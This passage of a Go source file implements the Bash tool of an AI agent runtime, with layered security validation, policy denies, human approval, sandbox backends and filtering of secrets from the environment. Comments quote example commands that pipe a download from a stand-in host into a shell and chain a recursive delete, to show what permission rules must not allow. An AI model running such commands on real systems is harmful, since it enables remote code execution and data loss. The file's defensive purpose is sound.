package bash

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/KPO-Tech/seshat-runtime/internal/envfilter"
	"github.com/KPO-Tech/seshat-runtime/internal/sandbox"
	"github.com/KPO-Tech/seshat-runtime/internal/shellparse"
	tool "github.com/KPO-Tech/seshat-runtime/internal/tools/registry"
	"github.com/KPO-Tech/seshat-runtime/internal/tools/schema"
	"github.com/KPO-Tech/seshat-runtime/internal/types"
	"github.com/KPO-Tech/seshat-runtime/pkg/runtimepath"
)

const (
	// DefaultTimeout is the default command timeout.
	DefaultTimeout = 30 * time.Second

	// MaxTimeout is the maximum allowed timeout.
	MaxTimeout = 5 * time.Minute

	// MaxOutputSize is the default maximum captured output size (100 KB).
	MaxOutputSize = 100 * 1024

	// AbsoluteMaxOutputSize is the hard ceiling for output_bytes_cap (10 MB).
	AbsoluteMaxOutputSize = 10 * 1024 * 1024

	// headOutputFraction is the share of MaxOutputSize kept from the beginning
	// of the output when it exceeds the cap. The tail gets the remainder.
	// e.g. 0.4 → first 40 KB preserved, last 60 KB preserved.
	headOutputFraction = 0.4
)

// Tool represents the Bash tool.
type Tool struct {
	config            *ToolConfig
	securityValidator *SecurityValidator
	commandPolicy     *sandbox.CommandPolicy
	backgroundManager *BackgroundTaskManager
	shell             string // cached at construction time
	mu                sync.Mutex
	// sandboxExecutor, when non-nil, routes executeLocalCommand through an
	// OS-level sandbox backend (currently: sandbox.DockerExecutor) instead
	// of the raw exec.CommandContext + Landlock path. nil means "Landlock/
	// local" — today's behavior, unchanged.
	sandboxExecutor sandbox.Executor
}

// ToolConfig represents the Bash tool configuration.
type ToolConfig struct {
	Timeout          time.Duration
	MaxOutputSize    int64
	WorkingDirectory string
	EnableSandbox    bool
	// RequireSandbox makes the tool refuse to run when the workspace boundary is
	// set but Landlock is unavailable. Leave false for desktop use; set true for
	// multi-tenant server deployments.
	RequireSandbox bool
	// SandboxKind selects the OS-level sandbox backend to attempt before
	// falling back to Landlock/local. Empty (sandbox.EnvironmentLocal, the
	// zero value) preserves today's behavior. sandbox.EnvironmentDocker
	// routes execution through a persistent Docker container — see
	// SandboxDocker. If Docker isn't reachable at construction time, NewTool
	// logs a warning and falls back to Landlock/local exactly as if
	// SandboxKind had been left empty.
	SandboxKind sandbox.EnvironmentKind
	// SandboxDocker configures the Docker sandbox backend when SandboxKind
	// is sandbox.EnvironmentDocker. Zero value uses sandbox.DefaultDockerConfig().
	SandboxDocker sandbox.DockerExecutorConfig
	// Sandboxd configures the sidecar backend when SandboxKind is
	// sandbox.EnvironmentSandboxed. BinaryPath is required; an unavailable
	// sidecar refuses every command rather than running unconfined.
	Sandboxd sandbox.SandboxdConfig
	// OutputChunkCallback, when set, receives each output chunk as it is produced
	// (streaming mode). If nil, output is buffered and returned at completion.
	OutputChunkCallback func(chunk string, stream string)
}

// DefaultToolConfig returns a sensible default configuration.
func DefaultToolConfig() *ToolConfig {
	cwd, _ := os.Getwd()
	return &ToolConfig{
		Timeout:          DefaultTimeout,
		MaxOutputSize:    MaxOutputSize,
		WorkingDirectory: cwd,
		EnableSandbox:    false,
	}
}

// NewTool creates a new Bash tool.
func NewTool(config *ToolConfig) *Tool {
	if config == nil {
		config = DefaultToolConfig()
	}

	var sandboxExecutor sandbox.Executor
	switch config.SandboxKind {
	case sandbox.EnvironmentSandboxed:
		// Fail closed. A backend the operator asked for that cannot be brought
		// up must not turn into "it ran on the host anyway": an unavailable
		// executor refuses every command instead.
		sandboxdCfg := config.Sandboxd
		if len(sandboxdCfg.Shell) == 0 {
			// DetectShell names the interpreter the unsandboxed path uses, so a
			// sandboxed command keeps the same shell semantics (notably Git Bash
			// rather than cmd.exe on Windows).
			sandboxdCfg.Shell = []string{DetectShell(), "-c"}
		}
		executor, err := sandbox.NewExecutor(sandbox.ExecutorConfig{
			Kind:     sandbox.EnvironmentSandboxed,
			Sandboxd: sandboxdCfg,
		})
		if err == nil {
			healthCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			err = executor.Healthy(healthCtx)
			cancel()
		}
		if err != nil {
			slog.Error("bash tool: sandboxd requested but unavailable — refusing to run commands unconfined", "error", err)
			sandboxExecutor = sandbox.NewUnavailableExecutor(sandbox.EnvironmentSandboxed, err)
		} else {
			sandboxExecutor = executor
		}

	case sandbox.EnvironmentDocker:
		executor, err := sandbox.NewExecutor(sandbox.ExecutorConfig{
			Kind:   sandbox.EnvironmentDocker,
			Docker: config.SandboxDocker,
		})
		if err != nil {
			slog.Warn("bash tool: failed to initialize docker sandbox — falling back to Landlock/local", "error", err)
		} else {
			// Bounded, not context.Background() - Healthy shells out to
			// `docker version` (see sandbox.DockerExecutor.Healthy), and a
			// Docker daemon that's installed but unresponsive (stuck WSL2
			// integration, a hung engine, ...) must never be able to block
			// this constructor - and therefore every embedder's own startup,
			// e.g. a server binding its HTTP port - forever. A healthy
			// daemon answers in well under a second; 5s is generous slack,
			// not a tuned budget.
			healthCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			healthErr := executor.Healthy(healthCtx)
			cancel()
			if healthErr != nil {
				slog.Warn("bash tool: docker sandbox requested but unavailable — falling back to Landlock/local", "error", healthErr)
			} else {
				sandboxExecutor = executor
			}
		}
	}

	// Landlock (the only OS-level confinement executeLocalCommand falls back to)
	// is Linux-only — see landlock_stub.go. On every other platform (which today
	// means every desktop install: Windows, macOS) commands run directly on the
	// host with no isolation, unless the operator opts into RequireSandbox and
	// accepts that bash then refuses to run at all, or into SandboxKind=Docker
	// above. That tradeoff needs to be visible, not silent, for an agent
	// platform that executes model-issued shell commands.
	if sandboxExecutor == nil && !SandboxAvailable() && !config.RequireSandbox {
		slog.Warn(
			"bash tool: no OS-level sandbox available on this platform — shell commands will run unconfined on the host",
			"platform", runtime.GOOS,
			"hint", "Landlock (the current confinement backend) is Linux-only and no Docker sandbox is configured; install srt (npm i -g @anthropic-ai/sandbox-runtime) or set ToolConfig.SandboxKind=sandbox.EnvironmentDocker for real isolation, or RequireSandbox=true to refuse unconfined execution instead of allowing it silently",
		)
	}

	bm := NewBackgroundTaskManager(runtimepath.BashTasksDir(""))
	_ = bm.Init()
	globalTaskManager = bm // expose to package-level callers (monitor, task-list tools)

	return &Tool{
		config:            config,
		securityValidator: NewSecurityValidator(),
		commandPolicy:     sandbox.NewDefaultCommandPolicy(),
		backgroundManager: bm,
		shell:             DetectShell(),
		sandboxExecutor:   sandboxExecutor,
	}
}

// Definition returns the tool definition.
func (t *Tool) Definition() tool.Definition {
	return tool.Definition{
		Name:        ToolName,
		DisplayName: "Bash",
		SearchHint:  SearchHint,
		Description: Description + shellNote(runtime.GOOS, t.shell),
		Category:    "filesystem",
		InputSchema: schema.FromMap(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"command": map[string]any{
					"type":        "string",
					"description": "Shell command to execute",
				},
				"timeout": map[string]any{
					"type":        "number",
					"description": "Timeout in seconds (default: 30, max: 300)",
				},
				"description": map[string]any{
					"type":        "string",
					"description": "Clear, concise description of what this command does in 5-10 words, active voice, present tense (e.g. \"Lists files in the current directory\", \"Installs package dependencies\", \"Runs the test suite\"). Shown to the user in the collapsed tool-call line in place of the raw command, so avoid vague wording like \"Runs a command\".",
				},
				"run_in_background": map[string]any{
					"type":        "boolean",
					"description": "Run the command in the background and return immediately",
				},
				"stdin": map[string]any{
					"type":        "string",
					"description": "Optional data to pipe into the command's stdin",
				},
				"output_bytes_cap": map[string]any{
					"type":        "number",
					"description": "Maximum bytes to capture from output (default: 102400, max: 10485760)",
				},
			},
			"required": []string{"command", "description"},
		}),
		IsReadOnly:         false,
		IsConcurrencySafe:  false,
		IsDestructive:      true,
		RequiresPermission: true,
		Metadata:           map[string]any{"surface_profiles": []string{"mono_run", "skill_agent"}},
	}
}

// Call executes the tool.
func (t *Tool) Call(
	ctx context.Context,
	input tool.CallInput,
	permissionCheck types.CanUseToolFn,
) (tool.CallResult, error) {
	directCall := input.ToolContext == nil
	toolCtx := input.ToolContextValue()
	workingDirectory := t.effectiveWorkingDirectory(toolCtx)

	command, ok := input.Parsed["command"].(string)
	if !ok || strings.TrimSpace(command) == "" {
		return tool.NewErrorResult(fmt.Errorf("command is required and must be a string")), nil
	}

	timeout := t.config.Timeout
	if timeoutSec, ok := input.Parsed["timeout"].(float64); ok && timeoutSec > 0 {
		timeout = time.Duration(timeoutSec) * time.Second
		if timeout > MaxTimeout {
			timeout = MaxTimeout
		}
	}

	description, _ := input.Parsed["description"].(string)
	runInBackground, _ := input.Parsed["run_in_background"].(bool)
	stdinData, _ := input.Parsed["stdin"].(string)

	outputBytesCap := t.config.MaxOutputSize
	if capVal, ok := input.Parsed["output_bytes_cap"].(float64); ok && capVal > 0 {
		outputBytesCap = int64(capVal)
		if outputBytesCap > AbsoluteMaxOutputSize {
			outputBytesCap = AbsoluteMaxOutputSize
		}
	}

	// Intercept apply_patch — must use the dedicated tool.
	if isApplyPatchInvocation(command) {
		return tool.NewErrorResult(fmt.Errorf(
			"apply_patch must be invoked via the apply_patch tool, not via bash — " +
				"use the apply_patch tool to get structured permission checks and approval")), nil
	}

	// ── Layer 1: Structural security (always, before any permission logic) ──
	if viol := t.securityValidator.ValidateCommand(command); viol != nil {
		return tool.NewErrorResult(fmt.Errorf("security violation: %s", viol.Reason)), nil
	}
	if viol := t.securityValidator.ValidateGitCommand(command); viol != nil {
		return tool.NewErrorResult(fmt.Errorf("git security violation: %s", viol.Reason)), nil
	}
	if viol := t.securityValidator.ValidateWorkspace(command, workingDirectory); viol != nil {
		return tool.NewErrorResult(fmt.Errorf("workspace violation: %s", viol.Reason)), nil
	}

	// ── Layer 2: Policy hard-deny (catastrophic commands, deny fragments) ──
	policyResult := t.commandPolicy.Evaluate(command)
	if policyResult.Decision == sandbox.DecisionDeny {
		return tool.NewErrorResult(fmt.Errorf("permission denied: %s", policyResult.Reason)), nil
	}

	execCtx := &ExecutionContext{
		Command:             command,
		Description:         description,
		Timeout:             timeout,
		WorkingDirectory:    workingDirectory,
		MaxOutputSize:       outputBytesCap,
		EnableSandbox:       t.config.EnableSandbox,
		RunInBackground:     runInBackground,
		Stdin:               stdinData,
		OutputChunkCallback: t.config.OutputChunkCallback,
		SessionID:           string(toolCtx.SessionID),
	}

	// ── Layer 3: Approval pipeline (direct calls only) ────────────────────
	if directCall {
		// Evaluate already bakes in IsKnownSafe: DecisionAllow means the command
		// is either on the explicit allowlist or is a pure read/state-change command.
		// Both cases bypass the global approval pipeline entirely.
		// Mirrors Codex's ExecApprovalRequirement::Skip.
		// The policy reads the line as a whole: "ls\nrm -rf x" and "cat x | bash"
		// are classified as plain reads. Only a single simple command skips the
		// approval, never a chain, a substitution or a redirection.
		skipApproval := policyResult.Decision == sandbox.DecisionAllow && isSingleSimpleCommand(command)

		// Mode-specific fast-path (e.g. AcceptEdits allows certain writes).
		if !skipApproval {
			modeResult := checkPermissionsMode(command, toolCtx.PermissionMode, workingDirectory)
			switch modeResult.Behavior {
			case types.PermissionBehaviorDeny:
				return tool.NewErrorResult(fmt.Errorf("permission denied: %s", modeResult.Reason)), nil
			case types.PermissionBehaviorAllow:
				skipApproval = true
			}
		}

		if !skipApproval {
			if permissionCheck == nil {
				reason := policyResult.Reason
				if reason == "" {
					reason = "command requires approval"
				}
				return tool.NewErrorResult(fmt.Errorf("permission denied: %s", reason)), nil
			}
			req := sandbox.PermissionRequest{
				ToolName:      "bash",
				Description:   description,
				Environment:   sandbox.EnvironmentLocal,
				Access:        sandbox.AccessExecute,
				Command:       command,
				Justification: description,
				Scope:         sandbox.ApprovalScopeToolCall,
				Metadata: map[string]any{
					"timeout_seconds":   timeout.Seconds(),
					"run_in_background": runInBackground,
				},
			}
			permissionResult, err := sandbox.ResolveToolPermission(ctx, permissionCheck, req, sandbox.ToolPermissionOptions{
				ToolInput: map[string]any{
					"command":           command,
					"timeout":           timeout.Seconds(),
					"description":       description,
					"run_in_background": runInBackground,
				},
				ToolUseID:              toolCtx.ToolUseID,
				SessionID:              toolCtx.SessionID,
				TurnID:                 toolCtx.TurnID,
				PermissionMode:         toolCtx.PermissionMode,
				WorkingDirectory:       execCtx.WorkingDirectory,
				IsToolRunningInSandbox: execCtx.EnableSandbox,
			})
			if err != nil {
				return tool.NewErrorResult(err), nil
			}
			if err := sandbox.ErrorForPermissionResult(permissionResult, "command requires approval"); err != nil {
				return tool.NewErrorResult(err), nil
			}
		}
	}

	// ── Execution ──────────────────────────────────────────────────────────
	if execCtx.RunInBackground || IsBackgroundCommand(command) {
		return t.executeBackground(ctx, execCtx)
	}

	result, err := t.executeCommand(ctx, execCtx)
	if err != nil {
		return tool.NewErrorResult(fmt.Errorf("command execution failed: %w", err)), nil
	}

	content := t.formatOutput(execCtx, result)
	callResult := tool.NewTextResult(content)
	callResult.Metadata = &tool.ResultMetadata{
		ExecutionDuration: result.Duration,
		Additional: map[string]any{
			"exit_code":         result.ExitCode,
			"stdout":            result.Stdout,
			"stderr":            result.Stderr,
			"timeout":           result.Timeout,
			"cwd":               result.CWD,
			"description":       execCtx.Description,
			"run_in_background": execCtx.RunInBackground,
			"sandboxed":         result.Sandboxed,
		},
	}
	return callResult, nil
}

// Description returns a human-readable description.
func (t *Tool) Description(_ context.Context) (string, error) {
	return "Execute shell commands with security validation, permission checks, foreground and background execution", nil
}

// ValidateInput validates and normalises bash input.
func (t *Tool) ValidateInput(_ context.Context, input map[string]any) (map[string]any, error) {
	command, ok := input["command"].(string)
	if !ok || strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("command is required and must be a string")
	}

	normalized := make(map[string]any, len(input))
	for k, v := range input {
		normalized[k] = v
	}
	if timeoutSec, ok := normalized["timeout"].(float64); ok && timeoutSec > 0 {
		if timeout := time.Duration(timeoutSec) * time.Second; timeout > MaxTimeout {
			normalized["timeout"] = MaxTimeout.Seconds()
		}
	}
	return normalized, nil
}

// CheckPermissions performs bash-specific permission checks before the global pipeline.
func (t *Tool) CheckPermissions(_ context.Context, input map[string]any, toolCtx tool.ToolUseContext) types.PermissionResult {
	command, _ := input["command"].(string)
	if strings.TrimSpace(command) == "" {
		return types.Deny("command is required and must be a string")
	}

	// Intercept apply_patch invocations: the model must use the dedicated
	// apply_patch tool. Running it through bash bypasses the structured
	// permission and approval pipeline.
	if isApplyPatchInvocation(command) {
		return types.Deny("Use the apply_patch tool directly — do not call apply_patch via bash. " +
			"The dedicated tool provides structured permission checks, approval previews, and progress events.")
	}

	workingDir := t.effectiveWorkingDirectory(toolCtx)

	// Structural security checks.
	if viol := t.securityValidator.ValidateCommand(command); viol != nil {
		return types.Deny(fmt.Sprintf("security violation: %s", viol.Reason))
	}
	if viol := t.securityValidator.ValidateGitCommand(command); viol != nil {
		return types.Deny(fmt.Sprintf("git security violation: %s", viol.Reason))
	}
	if viol := t.securityValidator.ValidateWorkspace(command, workingDir); viol != nil {
		return types.Deny(fmt.Sprintf("workspace violation: %s", viol.Reason))
	}

	// Policy hard-deny.
	policyResult := t.commandPolicy.Evaluate(command)
	if policyResult.Decision == sandbox.DecisionDeny {
		return types.Deny(policyResult.Reason)
	}

	// Mode-specific fast-paths (AcceptEdits, etc.).
	modeResult := checkPermissionsMode(command, toolCtx.PermissionMode, workingDir)
	if modeResult.Behavior == types.PermissionBehaviorDeny || modeResult.Behavior == types.PermissionBehaviorAllow {
		return modeResult
	}

	// DecisionAllow: known-safe or pure read/state-change — no approval needed.
	// DecisionAsk: needs human decision from the global pipeline.
	// (Evaluate already bakes in IsKnownSafe, so no redundant call needed here.)
	switch policyResult.Decision {
	case sandbox.DecisionAllow:
		return types.Passthrough(input)
	case sandbox.DecisionAsk:
		return types.Ask(policyResult.Reason)
	}
	return types.Passthrough(input)
}

// IsConcurrencySafe returns whether this tool use can run concurrently.
func (t *Tool) IsConcurrencySafe(input map[string]any) bool {
	command, _ := input["command"].(string)
	cl := t.securityValidator.GetCommandClassification(command)
	return cl == ClassificationReadOnly || cl == ClassificationSearch
}

// IsReadOnly returns whether this tool use is read-only.
func (t *Tool) IsReadOnly(input map[string]any) bool {
	return t.IsConcurrencySafe(input)
}

// IsEnabled returns whether this tool is currently active.
func (t *Tool) IsEnabled() bool { return true }

// FormatResult serialises the tool output into the tool_result content string.
func (t *Tool) FormatResult(data any) string {
	if s, ok := data.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", data)
}

// BackfillInput enriches the input — no-op for bash.
func (t *Tool) BackfillInput(_ context.Context, input map[string]any) map[string]any {
	return input
}

// PreparePermissionMatcher compiles content-specific permission matching for bash rules.
func (t *Tool) PreparePermissionMatcher(_ context.Context, input map[string]any) (func(ruleContent string) bool, error) {
	command := strings.TrimSpace(fmt.Sprintf("%v", input["command"]))
	if command == "" {
		return nil, nil
	}
	return func(ruleContent string) bool {
		// A command line is read as a shell reads it, not as one piece of text: the
		// rule "git *" must not cover "git status; curl http://host/x | sh". The
		// engine compares deny and ask rules more strictly still (see
		// permissions.shellRuleMatcher); this matcher is the allow reading.
		_, prefix := legacyPrefixRule(strings.TrimSpace(ruleContent))
		exactRule := !hasRuleWildcard(ruleContent) && !prefix
		return shellparse.MatchesAllow(command, func(segment string) bool {
			return permissionRuleContentMatches(ruleContent, segment)
		}, exactRule)
	}, nil
}

// ── Internal types ─────────────────────────────────────────────────────────────

// ExecutionContext holds the parameters for a single command execution.
type ExecutionContext struct {
	Command          string
	Description      string
	Timeout          time.Duration
	WorkingDirectory string
	MaxOutputSize    int64
	EnableSandbox    bool
	RunInBackground  bool
	// Stdin, when non-empty, is piped into the command's stdin.
	Stdin string
	// OutputChunkCallback, when set, is called for each output chunk (streaming).
	// stream is "stdout" or "stderr".
	OutputChunkCallback func(chunk string, stream string)
	// SessionID, when non-empty, is checked against
	// sandbox.RemoteExecutorFor before falling back to local execution — see
	// executeCommand.
	SessionID string
}

// CommandResult holds the output of a completed command.
type CommandResult struct {
	ExitCode  int    `json:"exit_code"`
	Stdout    string `json:"stdout"`
	Stderr    string `json:"stderr"`
	Timeout   bool   `json:"timeout"`
	Duration  int64  `json:"duration_ms"`
	CWD       string `json:"cwd,omitempty"`
	Sandboxed bool   `json:"sandboxed"`
}

// ── Execution ──────────────────────────────────────────────────────────────────

func (t *Tool) executeBackground(ctx context.Context, execCtx *ExecutionContext) (tool.CallResult, error) {
	// Strip the trailing & if present — it's a shell-level signal, not part of the command.
	command := strings.TrimSpace(execCtx.Command)
	if strings.HasSuffix(command, "&") {
		command = strings.TrimSpace(command[:len(command)-1])
	}

	_, actualCommand := parseEnvVars(command)
	task, err := t.backgroundManager.StartBackgroundTask(
		ctx,
		actualCommand,
		execCtx.WorkingDirectory,
		t.buildEnvironment(nil),
		t.shell,
	)
	if err != nil {
		return tool.NewErrorResult(fmt.Errorf("failed to start background task: %w", err)), nil
	}

	label := execCtx.Description
	if label == "" {
		label = actualCommand
	}
	content := fmt.Sprintf(
		"Background task started\nDescription: %s\nCommand: %s\nTask ID: %s\nWorking directory: %s",
		label, task.Command, task.ID, execCtx.WorkingDirectory,
	)

	result := tool.NewTextResult(content)
	result.Metadata = &tool.ResultMetadata{
		Additional: map[string]any{
			"task_id":     task.ID,
			"command":     task.Command,
			"description": execCtx.Description,
			"background":  true,
			"output_path": task.Output.Path,
			"working_dir": execCtx.WorkingDirectory,
		},
	}
	return result, nil
}

// executeCommand dispatches to whichever backend is configured for this
// call: a session-scoped RemoteExecutor when one is registered — the
// agent's commands then run inside the user's real, visible terminal
// instead of a detached subprocess — or the local exec.CommandContext path
// otherwise. Every session with no terminal ever opened keeps using the
// local path exactly as before — RemoteExecutorFor only returns ok=true
// once the host application (seshat-backend) has explicitly registered one.
func (t *Tool) executeCommand(ctx context.Context, execCtx *ExecutionContext) (*CommandResult, error) {
	if execCtx.SessionID != "" {
		if executor, ok := sandbox.RemoteExecutorFor(execCtx.SessionID); ok {
			return t.executeViaRemote(ctx, execCtx, executor)
		}
	}
	return t.executeLocalCommand(ctx, execCtx)
}

// executeViaRemote relays execCtx.Command through executor (e.g. Electron's
// terminal relay) instead of spawning a local subprocess. A failure here
// (relay disconnected mid-call, timeout, etc.) falls back to local execution
// rather than surfacing a confusing error — the remote path is a visibility
// upgrade for the user, not a hard requirement for bash to function.
func (t *Tool) executeViaRemote(ctx context.Context, execCtx *ExecutionContext, executor sandbox.Executor) (*CommandResult, error) {
	startTime := time.Now()
	cmdCtx, cancel := context.WithTimeout(ctx, execCtx.Timeout)
	defer cancel()

	res, err := executor.Run(cmdCtx, sandbox.RunRequest{
		Command: execCtx.Command,
		WorkDir: execCtx.WorkingDirectory,
		Timeout: execCtx.Timeout,
	})
	if err != nil {
		return t.executeLocalCommand(ctx, execCtx)
	}

	cwd := res.Cwd
	if cwd == "" {
		cwd = execCtx.WorkingDirectory
	}
	maxOut := execCtx.MaxOutputSize
	if maxOut <= 0 {
		maxOut = MaxOutputSize
	}
	return &CommandResult{
		ExitCode: res.ExitCode,
		Stdout:   capOutput(res.Stdout, maxOut),
		Stderr:   capOutput(res.Stderr, maxOut),
		Duration: time.Since(startTime).Milliseconds(),
		CWD:      cwd,
	}, nil
}

func (t *Tool) executeLocalCommand(ctx context.Context, execCtx *ExecutionContext) (*CommandResult, error) {
	startTime := time.Now()
	cmdCtx, cancel := context.WithTimeout(ctx, execCtx.Timeout)
	defer cancel()

	_, actualCommand := parseEnvVars(execCtx.Command)

	if t.sandboxExecutor != nil {
		return t.executeViaSandbox(cmdCtx, execCtx, actualCommand, startTime)
	}

	cmdPath, cmdArgs, sandboxEnv, sandboxed := commandWithLandlock(t.shell, shellArgs(t.shell, actualCommand), execCtx.WorkingDirectory)
	if !sandboxed {
		// Landlock is Linux-only; where srt is installed it confines the command on macOS and Windows.
		cmdPath, cmdArgs, sandboxed = srtCommand(t.shell, shellArgs(t.shell, actualCommand), execCtx.WorkingDirectory)
	}

	if execCtx.WorkingDirectory != "" && !sandboxed && t.config != nil && t.config.RequireSandbox {
		return nil, fmt.Errorf("sandbox required but unavailable on this host: refusing to run the command unconfined")
	}

	cmd := exec.CommandContext(cmdCtx, cmdPath, cmdArgs...)
	if execCtx.WorkingDirectory != "" {
		cmd.Dir = execCtx.WorkingDirectory
	}
	cmd.Env = append(t.buildEnvironment(nil), sandboxEnv...)
	cmd.SysProcAttr = newProcessGroupAttr()
	// Wire up stdin if provided; otherwise leave it nil (closed).
	if execCtx.Stdin != "" {
		cmd.Stdin = strings.NewReader(execCtx.Stdin)
	}

	// Kill the whole process group on timeout/cancel to prevent leaked children.
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		if err := killProcessGroup(cmd.Process.Pid); err != nil {
			return cmd.Process.Kill()
		}
		return nil
	}
	cmd.WaitDelay = 5 * time.Second

	maxOut := execCtx.MaxOutputSize
	if maxOut <= 0 {
		maxOut = MaxOutputSize
	}

	stdout, stderr, exitCode, timedOut := t.runCommand(cmdCtx, cmd, maxOut, execCtx.OutputChunkCallback)
	return &CommandResult{
		ExitCode:  exitCode,
		Stdout:    stdout,
		Stderr:    stderr,
		Timeout:   timedOut,
		Duration:  time.Since(startTime).Milliseconds(),
		CWD:       execCtx.WorkingDirectory,
		Sandboxed: sandboxed,
	}, nil
}

// executeViaSandbox runs the command through t.sandboxExecutor (currently:
// sandbox.DockerExecutor) instead of the raw exec.CommandContext + Landlock
// path. Streaming output chunks (execCtx.OutputChunkCallback) aren't
// supported here — the sandbox.Executor interface returns output only once
// the command completes — so callers relying on streaming won't see
// incremental chunks while running sandboxed. Output capping and formatting
// otherwise match executeLocalCommand exactly.
func (t *Tool) executeViaSandbox(ctx context.Context, execCtx *ExecutionContext, actualCommand string, startTime time.Time) (*CommandResult, error) {
	var stdin io.Reader
	if execCtx.Stdin != "" {
		stdin = strings.NewReader(execCtx.Stdin)
	}

	res, err := t.sandboxExecutor.Run(ctx, sandbox.RunRequest{
		Command: actualCommand,
		WorkDir: execCtx.WorkingDirectory,
		Timeout: execCtx.Timeout,
		Stdin:   stdin,
	})
	if err != nil {
		return nil, fmt.Errorf("sandboxed command execution failed: %w", err)
	}

	maxOut := execCtx.MaxOutputSize
	if maxOut <= 0 {
		maxOut = MaxOutputSize
	}

	return &CommandResult{
		ExitCode:  res.ExitCode,
		Stdout:    capOutput(res.Stdout, maxOut),
		Stderr:    capOutput(res.Stderr, maxOut),
		Duration:  time.Since(startTime).Milliseconds(),
		CWD:       execCtx.WorkingDirectory,
		Sandboxed: true,
	}, nil
}

func (t *Tool) runCommand(ctx context.Context, cmd *exec.Cmd, maxOutputSize int64, chunkCb func(string, string)) (stdout, stderr string, exitCode int, timeout bool) {
	stdoutBuf := newCappedBuffer(maxOutputSize)
	stderrBuf := newCappedBuffer(maxOutputSize)

	// The streams are given to exec as writers, not read from StdoutPipe: exec copies them in goroutines of its own and Wait returns only
	// when the copies are done (or cmd.WaitDelay after the process ended, for a child that kept the pipe open). Reading a pipe from
	// here while calling Wait closes the pipe under the reader, and a command that ends at once loses its whole output.
	cmd.Stdout = &chunkWriter{dst: stdoutBuf, stream: "stdout", cb: chunkCb}
	cmd.Stderr = &chunkWriter{dst: stderrBuf, stream: "stderr", cb: chunkCb}
	if err := cmd.Start(); err != nil {
		return "", fmt.Sprintf("failed to start command: %v", err), 1, false
	}
	waitErr := cmd.Wait()

	switch {
	case errors.Is(ctx.Err(), context.DeadlineExceeded):
		return stdoutBuf.String(), stderrBuf.String(), 124, true
	case errors.Is(ctx.Err(), context.Canceled):
		return stdoutBuf.String(), stderrBuf.String(), 130, false
	case waitErr != nil:
		var exitError *exec.ExitError
		if errors.As(waitErr, &exitError) {
			if status, ok := exitError.Sys().(syscall.WaitStatus); ok {
				return stdoutBuf.String(), stderrBuf.String(), status.ExitStatus(), false
			}
		}
		return stdoutBuf.String(), stderrBuf.String(), 1, false
	}
	return stdoutBuf.String(), stderrBuf.String(), 0, false
}

// chunkWriter writes what a command prints to dst and tells cb about each chunk as it comes. With a nil cb it is a plain writer.
type chunkWriter struct {
	dst    io.Writer
	stream string
	cb     func(chunk, stream string)
}

func (w *chunkWriter) Write(p []byte) (int, error) {
	if len(p) == 0 {
		return 0, nil
	}
	if _, err := w.dst.Write(p); err != nil {
		return 0, err
	}
	if w.cb != nil {
		w.cb(string(p), w.stream)
	}
	return len(p), nil
}

// capOutput applies the same head+tail-biased truncation as local command
// execution to a remote executor's already-complete output string.
func capOutput(s string, max int64) string {
	if max <= 0 {
		max = MaxOutputSize
	}
	if int64(len(s)) <= max {
		return s
	}
	buf := newCappedBuffer(max)
	buf.Write([]byte(s)) //nolint:errcheck // cappedBuffer.Write never returns an error
	return buf.String()
}

// ── Helpers ────────────────────────────────────────────────────────────────────

func (t *Tool) effectiveWorkingDirectory(toolCtx tool.ToolUseContext) string {
	if d := strings.TrimSpace(toolCtx.WorkingDirectory); d != "" {
		return d
	}
	if t != nil && t.config != nil {
		if d := strings.TrimSpace(t.config.WorkingDirectory); d != "" {
			return d
		}
	}
	return "."
}

// buildEnvironment is the environment of a command the model asked for: the one of the process without its secrets (the provider keys, the
// database and cloud credentials: a command can print them, and a prompt injection can send them out), see internal/envfilter.
func (t *Tool) buildEnvironment(extra map[string]string) []string {
	env := envfilter.Environ()
	for k, v := range extra {
		env = append(env, k+"="+v)
	}
	return env
}

func (t *Tool) formatOutput(execCtx *ExecutionContext, result *CommandResult) string {
	var b strings.Builder

	if execCtx.Description != "" {
		fmt.Fprintf(&b, "Description: %s\n", execCtx.Description)
	}
	fmt.Fprintf(&b, "Command: %s\n", execCtx.Command)
	fmt.Fprintf(&b, "Exit code: %d | Duration: %dms", result.ExitCode, result.Duration)
	if result.Timeout {
		b.WriteString(" | TIMEOUT")
	}
	if result.Sandboxed {
		b.WriteString(" | sandboxed")
	}
	b.WriteString("\n")

	if result.CWD != "" {
		fmt.Fprintf(&b, "Working directory: %s\n", result.CWD)
	}
	if result.Stdout != "" {
		b.WriteString("\nOutput:\n")
		b.WriteString(result.Stdout)
		if !strings.HasSuffix(result.Stdout, "\n") {
			b.WriteString("\n")
		}
	}
	if result.Stderr != "" {
		b.WriteString("\nErrors:\n")
		b.WriteString(result.Stderr)
		if !strings.HasSuffix(result.Stderr, "\n") {
			b.WriteString("\n")
		}
	}
	return b.String()
}

// IsBackgroundCommand checks if command ends with & (background operator).
func IsBackgroundCommand(command string) bool {
	return strings.HasSuffix(strings.TrimSpace(command), "&")
}

// isApplyPatchInvocation returns true when the command invokes apply_patch or
// applypatch as a bare shell command or as a segment inside a composed command.
// Codex intercepts these at the exec/sandbox level; Seshat denies them at the
// tool layer and requires the model to use the dedicated apply_patch tool.
func isApplyPatchInvocation(command string) bool {
	if applyPatchCommandName(command) {
		return true
	}
	p := NewParser()
	parsed := p.ParseCommand(command)
	for _, seg := range parsed.Segments {
		if applyPatchCommandName(seg.Text) {
			return true
		}
	}
	return false
}

// applyPatchCommandName checks whether the first token of s is apply_patch / applypatch.
func applyPatchCommandName(s string) bool {
	_, actual := parseEnvVars(strings.TrimSpace(s))
	fields := strings.Fields(actual)
	if len(fields) == 0 {
		return false
	}
	name := fields[0]
	// strip any path prefix: /usr/local/bin/apply_patch → apply_patch
	if idx := strings.LastIndexByte(name, '/'); idx >= 0 {
		name = name[idx+1:]
	}
	return name == "apply_patch" || name == "applypatch"
}

// SandboxAvailable reports whether an OS-level sandbox (currently: Landlock,
// Linux-only) is available on this host for confining bash execution. Host
// applications use this to surface the unconfined-execution tradeoff to the
// end user instead of leaving it as a backend-log-only warning — see
// ToolConfig.RequireSandbox and NewTool's startup log.
func SandboxAvailable() bool {
	return landlockAvailable() || srtAvailable()
}

// Sandbox backends reported by SandboxBackend.
const (
